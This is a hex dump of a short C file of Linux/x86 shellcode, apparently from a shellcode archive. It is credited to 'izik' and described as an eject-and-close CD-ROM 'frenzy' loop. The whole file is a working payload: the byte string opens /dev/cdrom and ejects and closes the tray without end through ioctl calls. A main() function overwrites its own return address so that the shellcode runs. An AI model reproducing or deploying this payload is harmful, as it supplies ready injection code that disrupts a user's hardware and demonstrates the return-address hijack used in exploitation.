00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 65 6a 65 63 74  20 26 20 63 6c 6f 73 65  |6) eject & close|
00000020  20 63 64 2d 72 6f 6d 20  66 72 65 6e 7a 79 20 6c  | cd-rom frenzy l|
00000030  6f 6f 70 20 28 66 6f 6c  6c 6f 77 73 20 22 2f 64  |oop (follows "/d|
00000040  65 76 2f 63 64 72 6f 6d  22 20 73 79 6d 6c 69 6e  |ev/cdrom" symlin|
00000050  6b 29 20 2d 20 34 35 20  62 79 74 65 73 0d 0a 20  |k) - 45 bytes.. |
00000060  2a 20 2d 20 69 7a 69 6b  20 3c 69 7a 69 6b 40 74  |* - izik <izik@t|
00000070  74 79 36 34 2e 6f 72 67  3e 0d 0a 20 2a 2f 0d 0a  |ty64.org>.. */..|
00000080  0d 0a 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |..char shellcode|
00000090  5b 5d 20 3d 20 0d 0a 0d  0a 09 22 5c 78 36 61 5c  |[] = ....."\x6a\|
000000a0  78 30 35 22 20 20 20 20  20 20 20 20 20 20 20 20  |x05"            |
000000b0  20 20 2f 2f 20 70 75 73  68 20 24 30 78 35 20 0d  |  // push $0x5 .|
000000c0  0a 09 22 5c 78 35 38 22  20 20 20 20 20 20 20 20  |.."\x58"        |
000000d0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 6f 70  |          // pop|
000000e0  20 25 65 61 78 20 0d 0a  09 22 5c 78 33 31 5c 78  | %eax ..."\x31\x|
000000f0  63 39 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c9"             |
00000100  20 2f 2f 20 78 6f 72 20  25 65 63 78 2c 25 65 63  | // xor %ecx,%ec|
00000110  78 20 0d 0a 09 22 5c 78  35 31 22 20 20 20 20 20  |x ..."\x51"     |
00000120  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000130  70 75 73 68 20 25 65 63  78 20 0d 0a 09 22 5c 78  |push %ecx ..."\x|
00000140  62 35 5c 78 30 38 22 20  20 20 20 20 20 20 20 20  |b5\x08"         |
00000150  20 20 20 20 20 2f 2f 20  6d 6f 76 20 24 30 78 38  |     // mov $0x8|
00000160  2c 25 63 68 20 0d 0a 09  22 5c 78 36 38 5c 78 36  |,%ch ..."\x68\x6|
00000170  34 5c 78 37 32 5c 78 36  66 5c 78 36 64 22 20 20  |4\x72\x6f\x6d"  |
00000180  2f 2f 20 70 75 73 68 20  24 30 78 36 64 36 66 37  |// push $0x6d6f7|
00000190  32 36 34 20 0d 0a 09 22  5c 78 36 38 5c 78 36 35  |264 ..."\x68\x65|
000001a0  5c 78 37 36 5c 78 32 66  5c 78 36 33 22 20 20 2f  |\x76\x2f\x63"  /|
000001b0  2f 20 70 75 73 68 20 24  30 78 36 33 32 66 37 36  |/ push $0x632f76|
000001c0  36 35 20 0d 0a 09 22 5c  78 36 38 5c 78 32 66 5c  |65 ..."\x68\x2f\|
000001d0  78 32 66 5c 78 32 66 5c  78 36 34 22 20 20 2f 2f  |x2f\x2f\x64"  //|
000001e0  20 70 75 73 68 20 24 30  78 36 34 32 66 32 66 32  | push $0x642f2f2|
000001f0  66 20 0d 0a 09 22 5c 78  38 39 5c 78 65 33 22 20  |f ..."\x89\xe3" |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000210  6d 6f 76 20 25 65 73 70  2c 25 65 62 78 20 0d 0a  |mov %esp,%ebx ..|
00000220  09 22 5c 78 63 64 5c 78  38 30 22 20 20 20 20 20  |."\xcd\x80"     |
00000230  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
00000240  24 30 78 38 30 20 0d 0a  09 22 5c 78 38 39 5c 78  |$0x80 ..."\x89\x|
00000250  63 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c3"             |
00000260  20 2f 2f 20 6d 6f 76 20  25 65 61 78 2c 25 65 62  | // mov %eax,%eb|
00000270  78 20 0d 0a 09 0d 0a 09  2f 2f 0d 0a 09 2f 2f 20  |x ......//...// |
00000280  3c 5f 6d 61 6b 65 69 6f  3e 3a 0d 0a 09 2f 2f 0d  |<_makeio>:...//.|
00000290  0a 0d 0a 09 22 5c 78 36  36 5c 78 62 39 5c 78 30  |...."\x66\xb9\x0|
000002a0  39 5c 78 35 33 22 20 20  20 20 20 20 2f 2f 20 6d  |9\x53"      // m|
000002b0  6f 76 20 24 30 78 35 33  30 39 2c 25 63 78 20 0d  |ov $0x5309,%cx .|
000002c0  0a 0d 0a 09 2f 2f 0d 0a  09 2f 2f 20 3c 5f 66 72  |....//...// <_fr|
000002d0  65 6e 7a 79 3e 3a 0d 0a  09 2f 2f 0d 0a 0d 0a 09  |enzy>:...//.....|
000002e0  22 5c 78 62 30 5c 78 33  36 22 20 20 20 20 20 20  |"\xb0\x36"      |
000002f0  20 20 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 24  |        // mov $|
00000300  30 78 33 36 2c 25 61 6c  20 0d 0a 09 22 5c 78 63  |0x36,%al ..."\xc|
00000310  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
00000320  20 20 20 20 2f 2f 20 69  6e 74 20 24 30 78 38 30  |    // int $0x80|
00000330  20 0d 0a 09 22 5c 78 66  35 22 20 20 20 20 20 20  | ..."\xf5"      |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 63  |            // c|
00000350  6d 63 20 0d 0a 09 22 5c  78 37 32 5c 78 66 35 22  |mc ..."\x72\xf5"|
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000370  20 6a 63 20 3c 5f 6d 61  6b 65 69 6f 3e 0d 0a 09  | jc <_makeio>...|
00000380  22 5c 78 38 30 5c 78 63  31 5c 78 31 30 22 20 20  |"\x80\xc1\x10"  |
00000390  20 20 20 20 20 20 20 20  2f 2f 20 61 64 64 20 24  |        // add $|
000003a0  30 78 31 30 2c 25 63 6c  20 0d 0a 09 22 5c 78 65  |0x10,%cl ..."\xe|
000003b0  62 5c 78 66 34 22 3b 20  20 20 20 20 20 20 20 20  |b\xf4";         |
000003c0  20 20 20 20 2f 2f 20 6a  6d 70 20 3c 5f 66 72 65  |    // jmp <_fre|
000003d0  6e 7a 79 3e 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |nzy>....int main|
000003e0  28 69 6e 74 20 61 72 67  63 2c 20 63 68 61 72 20  |(int argc, char |
000003f0  2a 2a 61 72 67 76 29 20  7b 0d 0a 09 69 6e 74 20  |**argv) {...int |
00000400  2a 72 65 74 3b 0d 0a 09  72 65 74 20 3d 20 28 69  |*ret;...ret = (i|
00000410  6e 74 20 2a 29 26 72 65  74 20 2b 20 32 3b 0d 0a  |nt *)&ret + 2;..|
00000420  09 28 2a 72 65 74 29 20  3d 20 28 69 6e 74 29 20  |.(*ret) = (int) |
00000430  73 68 65 6c 6c 63 6f 64  65 3b 0d 0a 7d           |shellcode;..}|
0000043d
